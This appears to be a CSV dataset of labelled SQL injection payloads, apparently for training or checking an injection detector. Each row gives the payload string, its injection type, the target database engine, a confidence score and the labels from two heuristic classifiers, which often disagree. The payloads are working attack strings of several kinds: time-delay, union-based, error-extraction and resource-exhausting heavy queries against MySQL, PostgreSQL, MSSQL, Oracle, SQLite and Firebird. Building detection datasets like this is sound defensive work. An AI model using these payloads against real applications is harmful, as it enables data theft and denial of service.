payload_norm,sqli_type,db_engine,confidence,reasoning,verdict,critique_reasons,suggested_type,suggested_db,id,a_type,a_db,a_signals,c_type,c_db,c_signals,payload_inner
"1"" ) ) ) and make_set ( 8403 = 8403,8899 ) and ( ( ( ""czvm"" like ""czvm",boolean_blind,mysql,0.8,make_set() for boolean blind,KEEP,,boolean_blind,mysql,1664,boolean_blind,generic,generic SQL keywords without specific signal,benign,generic,no SQLi signal in heuristic check,"1"" ) ) ) and make_set ( 8403 = 8403,8899 ) and ( ( ( ""czvm"" like ""czvm"
-3044' ) or 4999 = 3051#,boolean_blind,generic,0.8,OR equality for blind,KEEP,,boolean_blind,generic,1665,boolean_blind,generic,Pattern match: 'or 4999 = 3051' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)",-3044' ) or 4999 = 3051#
"1 ) ) as cbdx where 8998 = 8998 and elt ( 4249 = 4249,7259 ) --",boolean_blind,mysql,0.8,elt() for boolean blind,KEEP,,boolean_blind,mysql,1666,boolean_blind,mysql,Pattern match: 'elt (' → boolean_blind (P3); DB signature: mysql,boolean_blind,mysql,generic SQL structure without strong signal,"1 ) ) as cbdx where 8998 = 8998 and elt ( 4249 = 4249,7259 ) --"
select pg_sleep ( 5 ) and 'rpka' = 'rpka,time_blind,postgresql,0.9,pg_sleep for PostgreSQL time blind,KEEP,,time_blind,postgresql,1667,time_blind,postgresql,Pattern match: 'pg_sleep (' → time_blind (P5); DB signature: postgresql,boolean_blind,postgresql,generic SQL structure without strong signal,select pg_sleep ( 5 ) and 'rpka' = 'rpka
"1"" ) as esks where 1138 = 1138",boolean_blind,generic,0.8,WHERE equality for blind,KEEP,,boolean_blind,generic,1668,benign,generic,no attack signal detected,boolean_blind,generic,generic SQL structure without strong signal,"1"" ) as esks where 1138 = 1138"
-1700%' or 4149 = 3391#,boolean_blind,generic,0.8,OR equality for blind,KEEP,,boolean_blind,generic,1669,boolean_blind,generic,Pattern match: 'or 4149 = 3391' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)",-1700%' or 4149 = 3391#
1' in boolean mode ) or 4240 = ( select 4240 from pg_sleep ( 5 ) ) --,time_blind,postgresql,0.9,pg_sleep for PostgreSQL time blind,KEEP,,time_blind,postgresql,1670,time_blind,postgresql,Pattern match: 'pg_sleep (' → time_blind (P5); DB signature: postgresql,boolean_blind,postgresql,generic SQL structure without strong signal,1' in boolean mode ) or 4240 = ( select 4240 from pg_sleep ( 5 ) ) --
"1"" ) as mibc where 3113 = 3113",boolean_blind,generic,0.8,WHERE equality for blind,KEEP,,boolean_blind,generic,1671,benign,generic,no attack signal detected,boolean_blind,generic,generic SQL structure without strong signal,"1"" ) as mibc where 3113 = 3113"
select ( case when ( 5290 = 1720 ) then 5290 else 1/ ( select 0 ) end ) --,boolean_blind,generic,0.8,SELECT CASE WHEN for blind,KEEP,,boolean_blind,generic,1672,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,select ( case when ( 5290 = 1720 ) then 5290 else 1/ ( select 0 ) end ) --
"1%"" ) ) and 8407 = ( select count ( * ) from generate_series ( 1,5000000 ) ) and ( ( ""%"" = """,heavy_query,postgresql,0.9,generate_series for heavy query,KEEP,,heavy_query,postgresql,1673,heavy_query,postgresql,"Pattern match: 'generate_series ( 1,5000000 )' → heavy_query (P4); DB signature: postgresql",heavy_query,postgresql,contains 7+ digit number (DoS-style payload),"1%"" ) ) and 8407 = ( select count ( * ) from generate_series ( 1,5000000 ) ) and ( ( ""%"" = """
"1%' ) ) ) union all select null,null#",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,1674,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"1%' ) ) ) union all select null,null#"
"select sleep ( 5 ) and ( ( ""vzye"" = ""vzye",time_blind,generic,0.9,sleep() for time blind,KEEP,,time_blind,generic,1675,time_blind,mysql,Pattern match: 'sleep (' → time_blind (P5); DB signature: mysql,boolean_blind,mysql,generic SQL structure without strong signal,"select sleep ( 5 ) and ( ( ""vzye"" = ""vzye"
-9739' or 8571 = 8571--,boolean_blind,generic,0.8,OR equality for blind,KEEP,,boolean_blind,generic,1676,boolean_blind,generic,Pattern match: 'or 8571 = 8571' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)",-9739' or 8571 = 8571--
1'|| ( select 'exls' where 3837 = 3837 and sleep ( 5 ) ) ||',time_blind,generic,0.9,sleep() for time blind,KEEP,,time_blind,generic,1677,time_blind,mysql,Pattern match: 'sleep (' → time_blind (P5); DB signature: mysql,boolean_blind,mysql,generic SQL structure without strong signal,1'|| ( select 'exls' where 3837 = 3837 and sleep ( 5 ) ) ||'
1%' ) ) and 8594 = ( select 8594 from pg_sleep ( 5 ) ) --,time_blind,postgresql,0.9,pg_sleep for PostgreSQL time blind,KEEP,,time_blind,postgresql,1678,time_blind,postgresql,Pattern match: 'pg_sleep (' → time_blind (P5); DB signature: postgresql,boolean_blind,postgresql,generic SQL structure without strong signal,1%' ) ) and 8594 = ( select 8594 from pg_sleep ( 5 ) ) --
1 ) where 7159 = 7159,boolean_blind,generic,0.8,WHERE equality for blind,KEEP,,boolean_blind,generic,1679,benign,generic,no attack signal detected,boolean_blind,generic,generic SQL structure without strong signal,1 ) where 7159 = 7159
"( select * from ( select ( sleep ( 5 ) ) ) srmq ) and ( ""avyw"" = ""avyw",time_blind,generic,0.9,sleep() for time blind,KEEP,,time_blind,generic,1680,time_blind,mysql,Pattern match: 'sleep (' → time_blind (P5); DB signature: mysql,boolean_blind,mysql,generic SQL structure without strong signal,"( select * from ( select ( sleep ( 5 ) ) ) srmq ) and ( ""avyw"" = ""avyw"
"-9179"" ) union all select 7144,7144,7144,7144,7144,7144,7144,7144--",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,1681,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-9179"" ) union all select 7144,7144,7144,7144,7144,7144,7144,7144--"
"1' ) ) as wkys where 2478 = 2478 and 6055 = ctxsys.drithsx.sn ( 6055, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 6055 = 6055 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) --",error_based,oracle,0.85,ctxsys.drithsx for error extraction,KEEP,,error_based,oracle,1682,error_based,oracle,Pattern match: 'ctxsys.drithsx' → error_based (P4); DB signature: oracle,error_based,oracle,error function 'ctxsys.drithsx' detected,"1' ) ) as wkys where 2478 = 2478 and 6055 = ctxsys.drithsx.sn ( 6055, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 6055 = 6055 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) --"
"select pg_sleep ( 5 ) and ( ( ( ""nvuv"" like ""nvuv",time_blind,postgresql,0.9,pg_sleep for PostgreSQL time blind,KEEP,,time_blind,postgresql,1683,time_blind,postgresql,Pattern match: 'pg_sleep (' → time_blind (P5); DB signature: postgresql,boolean_blind,postgresql,generic SQL structure without strong signal,"select pg_sleep ( 5 ) and ( ( ( ""nvuv"" like ""nvuv"
"1"" ) as qayu where 6222 = 6222 union all select null,null,null#",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,1684,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"1"" ) as qayu where 6222 = 6222 union all select null,null,null#"
"1 ) union all select null,null,null,null,null,null,null#",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,1685,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"1 ) union all select null,null,null,null,null,null,null#"
"1"" ) as klur where 7046 = 7046 and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",heavy_query,sqlite,0.9,randomblob for heavy query,KEEP,,heavy_query,sqlite,1686,time_blind,sqlite,Pattern match: 'randomblob (' → time_blind (P5); DB signature: sqlite,heavy_query,sqlite,contains 7+ digit number (DoS-style payload),"1"" ) as klur where 7046 = 7046 and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --"
1'+ ( select tdkt where 4535 = 4535,boolean_blind,generic,0.8,WHERE equality for blind,KEEP,,boolean_blind,generic,1687,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,1'+ ( select tdkt where 4535 = 4535
1' ) where 5145 = 5145,boolean_blind,generic,0.8,WHERE equality for blind,KEEP,,boolean_blind,generic,1688,benign,generic,no attack signal detected,boolean_blind,generic,generic SQL structure without strong signal,1' ) where 5145 = 5145
1' ) ) or ( select * from ( select ( sleep ( 5 ) ) ) ydpu ) and ( ( 'ckmm' like 'ckmm,time_blind,generic,0.9,sleep() for time blind,KEEP,,time_blind,generic,1689,time_blind,mysql,Pattern match: 'sleep (' → time_blind (P5); DB signature: mysql,boolean_blind,mysql,generic SQL structure without strong signal,1' ) ) or ( select * from ( select ( sleep ( 5 ) ) ) ydpu ) and ( ( 'ckmm' like 'ckmm
"( select * from ( select ( sleep ( 5 ) ) ) srmq ) and ( ( ( ""%"" = """,time_blind,generic,0.9,sleep() for time blind,KEEP,,time_blind,generic,1690,time_blind,mysql,Pattern match: 'sleep (' → time_blind (P5); DB signature: mysql,boolean_blind,mysql,generic SQL structure without strong signal,"( select * from ( select ( sleep ( 5 ) ) ) srmq ) and ( ( ( ""%"" = """
"1"" ) ) ) or ( select * from ( select ( sleep ( 5 ) ) ) ydpu ) and ( ( ( ""djwo"" = ""djwo",time_blind,generic,0.9,sleep() for time blind,KEEP,,time_blind,generic,1691,time_blind,mysql,Pattern match: 'sleep (' → time_blind (P5); DB signature: mysql,boolean_blind,mysql,generic SQL structure without strong signal,"1"" ) ) ) or ( select * from ( select ( sleep ( 5 ) ) ) ydpu ) and ( ( ( ""djwo"" = ""djwo"
"-3737%"" union all select 4452,4452,4452#",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,1692,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-3737%"" union all select 4452,4452,4452#"
1' ) ) and 3814 = 4272--,boolean_blind,generic,0.8,AND equality for blind,KEEP,,boolean_blind,generic,1693,boolean_blind,generic,Pattern match: 'and 3814 = 4272' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)",1' ) ) and 3814 = 4272--
"select benchmark ( 5000000,md5 ( 0x4c4d6142 ) ) and 'nlrk' like 'nlrk",heavy_query,mysql,0.85,benchmark for heavy query,KEEP,,heavy_query,mysql,1694,time_blind,mysql,Pattern match: 'benchmark (' → time_blind (P5); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload),"select benchmark ( 5000000,md5 ( 0x4c4d6142 ) ) and 'nlrk' like 'nlrk"
1' ) ) and 3715 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 3715 = 3715 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ( 'hcpo' like 'hcpo,boolean_blind,mssql,0.8,CHAR case when for blind,KEEP,,boolean_blind,mssql,1695,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,1' ) ) and 3715 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 3715 = 3715 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ( 'hcpo' like 'hcpo
"call regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) ) +'",heavy_query,sqlite,0.9,randomblob for heavy query,KEEP,,heavy_query,sqlite,1696,benign,generic,no attack signal detected,heavy_query,generic,contains 7+ digit number (DoS-style payload),"call regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) ) +'"
select ( case when ( 5198 = 2518 ) then 5198 else cast ( 1 as int ) / ( select 0 from dual ) end ) from dual--,boolean_blind,generic,0.8,SELECT CASE WHEN for blind,KEEP,,boolean_blind,generic,1697,boolean_blind,oracle,generic SQL keywords without specific signal,boolean_blind,oracle,generic SQL structure without strong signal,select ( case when ( 5198 = 2518 ) then 5198 else cast ( 1 as int ) / ( select 0 from dual ) end ) from dual--
1' ) waitfor delay '0:0:5' and ( 'vtfs' = 'vtfs,time_blind,mssql,0.9,waitfor delay MSSQL time blind,KEEP,,time_blind,mssql,1698,time_blind,mssql,Pattern match: 'waitfor delay' → time_blind (P5); DB signature: mssql,time_blind,mssql,time function 'waitfor delay' detected,1' ) waitfor delay '0:0:5' and ( 'vtfs' = 'vtfs
"-8238' ) ) union all select 9797,9797,9797,9797,9797,9797,9797,9797#",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,1699,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-8238' ) ) union all select 9797,9797,9797,9797,9797,9797,9797,9797#"
-8504 where 3086 = 3086 or 1131 = 9188#,boolean_blind,generic,0.8,WHERE equality for blind,KEEP,,boolean_blind,generic,1700,boolean_blind,generic,Pattern match: 'or 1131 = 9188' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)",-8504 where 3086 = 3086 or 1131 = 9188#
1 where 6036 = 6036 and 7533 = 7533--,boolean_blind,generic,0.8,AND equality for blind,KEEP,,boolean_blind,generic,1701,boolean_blind,generic,Pattern match: 'and 7533 = 7533' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)",1 where 6036 = 6036 and 7533 = 7533--
1%' ) ) ) and 6240 = ( 'qqpjq'|| ( select case 6240 when 6240 then 1 else 0 end from rdb$database ) ||'qzvzq' ) and ( ( ( '%' = ',boolean_blind,firebird,0.8,CHAR case when for blind,KEEP,,boolean_blind,firebird,1702,boolean_blind,firebird,generic SQL keywords without specific signal,boolean_blind,firebird,generic SQL structure without strong signal,1%' ) ) ) and 6240 = ( 'qqpjq'|| ( select case 6240 when 6240 then 1 else 0 end from rdb$database ) ||'qzvzq' ) and ( ( ( '%' = '
-8409 ) ) as ipbz where 9984 = 9984 or 3371 = 3869,boolean_blind,generic,0.8,OR equality for blind,KEEP,,boolean_blind,generic,1703,boolean_blind,generic,Pattern match: 'or 3371 = 3869' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)",-8409 ) ) as ipbz where 9984 = 9984 or 3371 = 3869
1' ) ) as pqbq where 1865 = 1865,boolean_blind,generic,0.8,WHERE equality for blind,KEEP,,boolean_blind,generic,1704,benign,generic,no attack signal detected,boolean_blind,generic,generic SQL structure without strong signal,1' ) ) as pqbq where 1865 = 1865
"1"" ) where 4822 = 4822 union all select null,null,null,null,null,null,null,null,null,null--",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,1705,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"1"" ) where 4822 = 4822 union all select null,null,null,null,null,null,null,null,null,null--"
"select dbms_pipe.receive_message ( chr ( 66 ) ||chr ( 67 ) ||chr ( 79 ) ||chr ( 101 ) ,5 ) from dual and ( 'qomf' like 'qomf",time_blind,oracle,0.9,dbms_pipe for Oracle time blind,KEEP,,time_blind,oracle,1706,time_blind,oracle,Pattern match: 'dbms_pipe.receive_message' → time_blind (P5); DB signature: oracle,time_blind,oracle,time function 'dbms_pipe' detected,"select dbms_pipe.receive_message ( chr ( 66 ) ||chr ( 67 ) ||chr ( 79 ) ||chr ( 101 ) ,5 ) from dual and ( 'qomf' like 'qomf"
"1' ) ) union all select null,null,null,null,null--",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,1707,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"1' ) ) union all select null,null,null,null,null--"
"-6611%"" ) ) ) union all select 8918,8918#",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,1708,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-6611%"" ) ) ) union all select 8918,8918#"
1%' rlike sleep ( 5 ) #,time_blind,generic,0.9,sleep() for time blind,KEEP,,time_blind,generic,1709,time_blind,mysql,Pattern match: 'sleep (' → time_blind (P5); DB signature: mysql,boolean_blind,mysql,"boolean condition (1=1, RLIKE, or ELT)",1%' rlike sleep ( 5 ) #
1%' or sleep ( 5 ) and '%' = ',time_blind,generic,0.9,sleep() for time blind,KEEP,,time_blind,generic,1710,time_blind,mysql,Pattern match: 'sleep (' → time_blind (P5); DB signature: mysql,benign,generic,no SQLi signal in heuristic check,1%' or sleep ( 5 ) and '%' = '
"-9156' ) ) union all select 9110,9110,9110,9110#",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,1711,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-9156' ) ) union all select 9110,9110,9110,9110#"
"1%' ) ) ) and make_set ( 1543 = 5817,5817 ) and ( ( ( '%' = '",boolean_blind,mysql,0.8,make_set() for boolean blind,KEEP,,boolean_blind,mysql,1712,boolean_blind,generic,generic SQL keywords without specific signal,benign,generic,no SQLi signal in heuristic check,"1%' ) ) ) and make_set ( 1543 = 5817,5817 ) and ( ( ( '%' = '"
1 ) where 8433 = 8433 rlike ( select ( case when ( 7689 = 7689 ) then 1 else 0x28 end ) ) --,boolean_blind,generic,0.8,RLIKE case when for blind,KEEP,,boolean_blind,generic,1713,boolean_blind,mysql,Pattern match: 'rlike (' → boolean_blind (P3); DB signature: mysql,boolean_blind,mysql,"boolean condition (1=1, RLIKE, or ELT)",1 ) where 8433 = 8433 rlike ( select ( case when ( 7689 = 7689 ) then 1 else 0x28 end ) ) --
"1 ) where 4710 = 4710 procedure analyse ( extractvalue ( 5840,concat ( 0x5c,0x7171706a71, ( select ( case when ( 5840 = 5840 ) then 1 else 0 end ) ) ,0x717a767a71 ) ) ,1 ) --",error_based,mysql,0.85,extractvalue for error extraction,KEEP,,error_based,mysql,1714,error_based,mysql,Pattern match: 'extractvalue (' → error_based (P4); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload),"1 ) where 4710 = 4710 procedure analyse ( extractvalue ( 5840,concat ( 0x5c,0x7171706a71, ( select ( case when ( 5840 = 5840 ) then 1 else 0 end ) ) ,0x717a767a71 ) ) ,1 ) --"
"-8640 ) or elt ( 7657 = 5020,5020 ) and ( 2346 = 2346",boolean_blind,mysql,0.8,elt() for boolean blind,KEEP,,boolean_blind,mysql,1715,boolean_blind,mysql,Pattern match: 'elt (' → boolean_blind (P3); DB signature: mysql,benign,generic,no SQLi signal in heuristic check,"-8640 ) or elt ( 7657 = 5020,5020 ) and ( 2346 = 2346"
( select * from ( select ( sleep ( 5 ) ) ) srmq ) and ( 'pgth' = 'pgth,time_blind,generic,0.9,sleep() for time blind,KEEP,,time_blind,generic,1716,time_blind,mysql,Pattern match: 'sleep (' → time_blind (P5); DB signature: mysql,boolean_blind,mysql,generic SQL structure without strong signal,( select * from ( select ( sleep ( 5 ) ) ) srmq ) and ( 'pgth' = 'pgth
"1"" ) or ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8113 = 8113,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) and ( ""mejy"" = ""mejy",boolean_blind,mysql,0.8,ELT IF for boolean blind,KEEP,,boolean_blind,mysql,1717,boolean_blind,mysql,Pattern match: 'elt (' → boolean_blind (P3); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload),"1"" ) or ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8113 = 8113,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) and ( ""mejy"" = ""mejy"
"-3775' ) or 1 group by concat ( 0x7171706a71, ( select ( case when ( 4232 = 4232 ) then 1 else 0 end ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) having min ( 0 ) #",boolean_blind,mysql,0.8,group by concat for boolean blind,KEEP,,boolean_blind,mysql,1718,boolean_blind,generic,generic SQL keywords without specific signal,heavy_query,generic,contains 7+ digit number (DoS-style payload),"-3775' ) or 1 group by concat ( 0x7171706a71, ( select ( case when ( 4232 = 4232 ) then 1 else 0 end ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) having min ( 0 ) #"
"1"" where 1234 = 1234",boolean_blind,generic,0.8,WHERE equality for blind,KEEP,,boolean_blind,generic,1719,benign,generic,no attack signal detected,boolean_blind,generic,generic SQL structure without strong signal,"1"" where 1234 = 1234"
"1%' ) and elt ( 4670 = 9403,9403 ) and ( '%' = '",boolean_blind,mysql,0.8,elt() for boolean blind,KEEP,,boolean_blind,mysql,1720,boolean_blind,mysql,Pattern match: 'elt (' → boolean_blind (P3); DB signature: mysql,benign,generic,no SQLi signal in heuristic check,"1%' ) and elt ( 4670 = 9403,9403 ) and ( '%' = '"
"waitfor delay '0:0:5' and ""%"" = """,time_blind,mssql,0.9,waitfor delay MSSQL time blind,KEEP,,time_blind,mssql,1721,time_blind,mssql,Pattern match: 'waitfor delay' → time_blind (P5); DB signature: mssql,time_blind,mssql,time function 'waitfor delay' detected,"waitfor delay '0:0:5' and ""%"" = """
( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 1931 = 1931 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ),boolean_blind,generic,0.8,SELECT CASE WHEN for blind,KEEP,,boolean_blind,generic,1722,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 1931 = 1931 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) )
"1%"" ) ) ) union all select null,null,null#",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,1723,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"1%"" ) ) ) union all select null,null,null#"
1 ) where 6725 = 6725 and 1553 = 7419,boolean_blind,generic,0.75,Multiplication for blind,KEEP,,boolean_blind,generic,1724,boolean_blind,generic,Pattern match: 'and 1553 = 7419' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)",1 ) where 6725 = 6725 and 1553 = 7419
1' where 1557 = 1557,boolean_blind,generic,0.8,WHERE equality for blind,KEEP,,boolean_blind,generic,1725,benign,generic,no attack signal detected,boolean_blind,generic,generic SQL structure without strong signal,1' where 1557 = 1557
"-2246"" ) ) union all select 4613,4613,4613,4613,4613,4613#",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,1726,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-2246"" ) ) union all select 4613,4613,4613,4613,4613,4613#"
"-2726"" ) ) or elt ( 1032 = 1032,3623 ) and ( ( ""ococ"" = ""ococ",boolean_blind,mysql,0.8,elt() for boolean blind,KEEP,,boolean_blind,mysql,1727,boolean_blind,mysql,Pattern match: 'elt (' → boolean_blind (P3); DB signature: mysql,benign,generic,no SQLi signal in heuristic check,"-2726"" ) ) or elt ( 1032 = 1032,3623 ) and ( ( ""ococ"" = ""ococ"
1%' waitfor delay '0:0:5' and '%' = ',time_blind,mssql,0.9,waitfor delay MSSQL time blind,KEEP,,time_blind,mssql,1728,time_blind,mssql,Pattern match: 'waitfor delay' → time_blind (P5); DB signature: mssql,time_blind,mssql,time function 'waitfor delay' detected,1%' waitfor delay '0:0:5' and '%' = '
"1"" ) and 6969 = ( select 6969 from pg_sleep ( 5 ) ) and ( ""cjkk"" like ""cjkk",time_blind,postgresql,0.9,pg_sleep for PostgreSQL time blind,KEEP,,time_blind,postgresql,1729,time_blind,postgresql,Pattern match: 'pg_sleep (' → time_blind (P5); DB signature: postgresql,boolean_blind,postgresql,generic SQL structure without strong signal,"1"" ) and 6969 = ( select 6969 from pg_sleep ( 5 ) ) and ( ""cjkk"" like ""cjkk"
1%' ) ) ) and sleep ( 5 ) #,time_blind,generic,0.9,sleep() for time blind,KEEP,,time_blind,generic,1730,time_blind,mysql,Pattern match: 'sleep (' → time_blind (P5); DB signature: mysql,benign,generic,no SQLi signal in heuristic check,1%' ) ) ) and sleep ( 5 ) #
"1"" ) as hblk where 7982 = 7982 and 9611 = 6142--",boolean_blind,generic,0.8,AND equality for blind,KEEP,,boolean_blind,generic,1731,boolean_blind,generic,Pattern match: 'and 9611 = 6142' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)","1"" ) as hblk where 7982 = 7982 and 9611 = 6142--"
"-7845' union all select 9574,9574,9574,9574,9574,9574#",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,1732,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-7845' union all select 9574,9574,9574,9574,9574,9574#"
"1', ( case when 8260 = 8260 then 1 else null end )",boolean_blind,generic,0.8,SELECT CASE WHEN for blind,KEEP,,boolean_blind,generic,1733,benign,generic,no attack signal detected,benign,generic,no SQLi signal in heuristic check,"1', ( case when 8260 = 8260 then 1 else null end )"
"1"" where 8734 = 8734",boolean_blind,generic,0.8,WHERE equality for blind,KEEP,,boolean_blind,generic,1734,benign,generic,no attack signal detected,boolean_blind,generic,generic SQL structure without strong signal,"1"" where 8734 = 8734"
"1"" ) and 8407 = ( select count ( * ) from generate_series ( 1,5000000 ) ) and ( ""wmmg"" like ""wmmg",heavy_query,postgresql,0.9,generate_series for heavy query,KEEP,,heavy_query,postgresql,1735,heavy_query,postgresql,"Pattern match: 'generate_series ( 1,5000000 )' → heavy_query (P4); DB signature: postgresql",heavy_query,postgresql,contains 7+ digit number (DoS-style payload),"1"" ) and 8407 = ( select count ( * ) from generate_series ( 1,5000000 ) ) and ( ""wmmg"" like ""wmmg"
"-1597"" where 5933 = 5933 or 3038 = 3038",boolean_blind,generic,0.8,OR equality for blind,KEEP,,boolean_blind,generic,1736,boolean_blind,generic,Pattern match: 'or 3038 = 3038' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)","-1597"" where 5933 = 5933 or 3038 = 3038"
